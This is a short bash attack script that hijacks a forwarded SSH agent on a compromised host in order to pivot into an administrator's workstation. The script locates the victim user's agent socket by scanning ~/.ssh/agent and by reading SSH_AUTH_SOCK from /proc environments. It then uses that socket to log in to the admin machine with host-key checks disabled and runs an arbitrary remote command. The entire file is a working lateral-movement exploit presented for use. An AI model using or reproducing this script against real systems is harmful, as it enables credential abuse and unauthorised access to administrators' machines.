#!/usr/bin/env bash
# Admin used ssh -A to YOUR infected host. Hijack agent → SSH to admin workstation.
# Usage: sudo ./pivot_agent_to_admin.sh [ADMIN_IP] [SSH_SERVER_PORT]
set -euo pipefail

VICTIM_USER="${VICTIM_USER:-legacy}"
SSH_SERVER_PORT="${2:-2221}"
ADMIN_IP="${1:-}"

if [[ -z "$ADMIN_IP" ]]; then
  ADMIN_IP=$(ss -tnH state established "( sport = :${SSH_SERVER_PORT} )" \
    | awk '{print $4}' | sed 's/:.*//' | head -1)
fi
[[ -n "$ADMIN_IP" ]] || { echo "Usage: $0 <ADMIN_IP> [ssh_listen_port]"; exit 1; }

ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_SSH_PORT="${ADMIN_SSH_PORT:-22}"

AUTH_SOCK=""
shopt -s nullglob
for s in /home/"${VICTIM_USER}"/.ssh/agent/*; do
  [[ -S "$s" ]] && AUTH_SOCK="$s" && break
done
shopt -u nullglob

if [[ -z "$AUTH_SOCK" ]]; then
  for pid in $(pgrep -u "$VICTIM_USER" 2>/dev/null); do
    sock=$(tr '\0' '\n' < "/proc/$pid/environ" 2>/dev/null | sed -n 's/^SSH_AUTH_SOCK=//p' | head -1)
    [[ -n "$sock" && -S "$sock" ]] && AUTH_SOCK="$sock" && break
  done
fi

[[ -n "$AUTH_SOCK" ]] || {
  echo "[-] No forwarded agent for user ${VICTIM_USER} (admin must use ssh -A)"
  exit 1
}

echo "[+] SSH_AUTH_SOCK=${AUTH_SOCK}"
echo "[+] Pivot -> ${ADMIN_USER}@${ADMIN_IP}:${ADMIN_SSH_PORT}"

runuser -u "$VICTIM_USER" -- env SSH_AUTH_SOCK="$AUTH_SOCK" \
  ssh -o IdentityAgent="$AUTH_SOCK" -o PreferredAuthentications=publickey \
  -o PasswordAuthentication=no -o BatchMode=yes -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null -p "$ADMIN_SSH_PORT" \
  "${ADMIN_USER}@${ADMIN_IP}" "${REMOTE_CMD:-id; hostname; whoami}"